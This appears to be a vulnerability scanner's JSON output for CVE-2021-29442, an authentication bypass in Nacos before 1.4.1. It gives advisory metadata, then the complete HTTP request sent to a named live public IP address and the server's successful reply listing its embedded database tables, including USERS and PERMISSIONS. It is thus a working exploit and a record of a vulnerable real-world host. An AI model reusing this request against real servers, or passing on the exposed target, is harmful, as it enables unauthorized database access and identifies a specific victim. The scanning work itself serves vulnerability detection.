{
    "CVE-2021-29442": {
        "info": {
            "name": "Nacos <1.4.1 - Authentication Bypass",
            "author": "dwisiswant0",
            "severity": "high",
            "description": "Nacos before version 1.4.1 is vulnerable to authentication bypass because the ConfigOpsController lets the user perform management operations like querying the database or even wiping it out. While the /data/remove endpoint is properly protected with the @Secured annotation, the /derby endpoint is not protected and can be openly accessed by unauthenticated users. These endpoints are only valid when using embedded storage (derby DB) so this issue should not affect those installations using external storage (e.g. mysql).\n",
            "impact": "Successful exploitation of this vulnerability can lead to unauthorized access to sensitive data and potential compromise of the Nacos server.\n",
            "remediation": "Upgrade Nacos to version 1.4.1 or later to mitigate the authentication bypass vulnerability (CVE-2021-29442).\n",
            "reference": [
                "https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/",
                "https://github.com/alibaba/nacos/issues/4463",
                "https://github.com/alibaba/nacos/pull/4517",
                "https://github.com/advisories/GHSA-36hp-jr8h-556f",
                "https://nvd.nist.gov/vuln/detail/CVE-2021-29442"
            ],
            "classification": {
                "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                "cvss-score": 7.5,
                "cve-id": "CVE-2021-29442",
                "cwe-id": "CWE-306",
                "epss-score": 0.96724,
                "epss-percentile": 0.99657,
                "cpe": "cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*"
            },
            "metadata": {
                "max-request": 1,
                "vendor": "alibaba",
                "product": "nacos"
            },
            "tags": "cve2021,cve,nacos,auth-bypass,alibaba"
        },
        "targets": [
            {
                "target": "http://106.52.93.192:8848",
                "req_resp": [
                    {
                        "req": "GET /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st HTTP/1.1\r\nHOST: 106.52.93.192\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
                        "resp": "HTTP/1.1 200\r\nContent-Type: application/json;charset=UTF-8\r\nTransfer-Encoding: chunked\r\nDate: Fri, 21 Mar 2025 14:29:46 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\n{\"code\":200,\"message\":null,\"data\":[{\"TABLENAME\":\"APP_CONFIGDATA_RELATION_PUBS\"},{\"TABLENAME\":\"APP_CONFIGDATA_RELATION_SUBS\"},{\"TABLENAME\":\"APP_LIST\"},{\"TABLENAME\":\"CONFIG_INFO\"},{\"TABLENAME\":\"CONFIG_INFO_AGGR\"},{\"TABLENAME\":\"CONFIG_INFO_BETA\"},{\"TABLENAME\":\"CONFIG_INFO_TAG\"},{\"TABLENAME\":\"CONFIG_TAGS_RELATION\"},{\"TABLENAME\":\"GROUP_CAPACITY\"},{\"TABLENAME\":\"HIS_CONFIG_INFO\"},{\"TABLENAME\":\"PERMISSIONS\"},{\"TABLENAME\":\"ROLES\"},{\"TABLENAME\":\"SYSALIASES\"},{\"TABLENAME\":\"SYSCHECKS\"},{\"TABLENAME\":\"SYSCOLPERMS\"},{\"TABLENAME\":\"SYSCOLUMNS\"},{\"TABLENAME\":\"SYSCONGLOMERATES\"},{\"TABLENAME\":\"SYSCONSTRAINTS\"},{\"TABLENAME\":\"SYSDEPENDS\"},{\"TABLENAME\":\"SYSDUMMY1\"},{\"TABLENAME\":\"SYSFILES\"},{\"TABLENAME\":\"SYSFOREIGNKEYS\"},{\"TABLENAME\":\"SYSKEYS\"},{\"TABLENAME\":\"SYSPERMS\"},{\"TABLENAME\":\"SYSROLES\"},{\"TABLENAME\":\"SYSROUTINEPERMS\"},{\"TABLENAME\":\"SYSSCHEMAS\"},{\"TABLENAME\":\"SYSSEQUENCES\"},{\"TABLENAME\":\"SYSSTATEMENTS\"},{\"TABLENAME\":\"SYSSTATISTICS\"},{\"TABLENAME\":\"SYSTABLEPERMS\"},{\"TABLENAME\":\"SYSTABLES\"},{\"TABLENAME\":\"SYSTRIGGERS\"},{\"TABLENAME\":\"SYSUSERS\"},{\"TABLENAME\":\"SYSVIEWS\"},{\"TABLENAME\":\"TENANT_CAPACITY\"},{\"TABLENAME\":\"TENANT_INFO\"},{\"TABLENAME\":\"USERS\"}]}"
                    }
                ]
            }
        ]
    }
}